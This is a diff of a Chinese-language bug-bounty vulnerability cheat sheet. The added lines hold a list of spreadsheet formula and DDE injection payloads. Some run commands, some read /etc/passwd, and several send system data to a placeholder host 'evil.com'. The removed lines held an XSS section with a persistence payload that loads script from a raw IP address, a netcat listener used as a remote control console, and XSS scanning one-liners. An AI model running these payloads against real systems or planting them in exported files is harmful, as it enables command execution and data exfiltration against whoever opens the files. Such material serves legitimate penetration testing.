@@ -11,6 +11,7 @@ SRC主流漏洞
 + sql
 + 其它
 
+
 开放重定位漏洞
 ----------------------------------------
 + 类型
@@ -27,35 +28,41 @@ SRC主流漏洞
 ----------------------------------------
 + 标题姓名地址填写payload： ``=1+1``，查看导出的execl文件中标题是否变成 ``2`` 。
 + payload: ``=AND(2>1)``，查看导出的execl文件中是否显示 ``TRUE`` 。
-+ payload： ``=cmd|' /C calc'!A0``，当用户打开文件时会执行命令。
++ DDE注入：
+    ::
+        
+        =cmd|' /C calc'!A0
+        -1+1+cmd|'/C calc'!A0
+        %0A=cmd|'/C calc'!A0
+        =DDE("cmd";"/C calc";"!A0")A0
+        =EXEC("calc.exe")
+        =AND(1>2)
+        =AND(1<2)
+        =1+1
+        =INFO("osversion")
+        =INFO("directory")
+        =INFO("system")
+        =INFO("release")
+        =INFO("numfile")
+        =INFO("memused")
+        =HYPERLINK("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")), "点我")
+        
+        Google Sheets:
+        =IMPORTXML("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")), "//a")
+        =IMPORTDATA("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")))
+        =IMPORTHTML("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")), "table", 1)
+        =IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
+        =IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
+        =IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
+        
+        linux下的payload：
+        =SHELL("whoami > /tmp/test.txt")
+        =WEBSERVICE("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")))
+        ='file:///etc/passwd'#$passwd.A1
+        =WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)))
 
-XSS
-----------------------------------------
-+ APK在线分析
-    - 对于apk中某些属性的页面显示，可能存在存储型xss的可能。
-+ 文件上传型
-    - pdf 文件上传XSS:需要google浏览器
-    - svg文件上传XSS
-    - html文件上传XSS
-    - swf文件上传XSS
-    - xml文件上传XSS
-    - 上传图片
-        ::
-
-            如果上传数据是：data:image/png;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
-            可以修改为：data:text/html;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
-+ 反射型XSS持久化
-    - payload： ``<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//198.2.235.223:8888";d.body.appendChild(z)},5)</script>``
-    - vps上运行： ``while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp 8888 >/dev/null; done`` , 如输入 ``alert('x')`` ,客户端就会弹出x。
-    - payload的意思是每隔5秒钟就向当前页面的body注入一段script，这个script会向vps发送一个请求，vps上监听8888端口，收到请求后会在控制台打印 ``ZephrFishHackerOne>$``，等待输入命令，输入命令后会发送到客户端执行。
-+ 常见场景
-    - 在线客服
-    - 个人资料修改
-    - 评论区
-    - 文本编辑器（所有功能）
-+ 命令
-    - ``echo https://www.example.com/ | gau | gf xss| uro | Gxss | kxss | tee xss_output.txt``
-    - ``python loxs.py``
+        #VALUE!	或 #N/A ：公式执行了，但执行失败。
+        #NAME?	：函数不存在或被禁用。
 
 CSRF
 ----------------------------------------
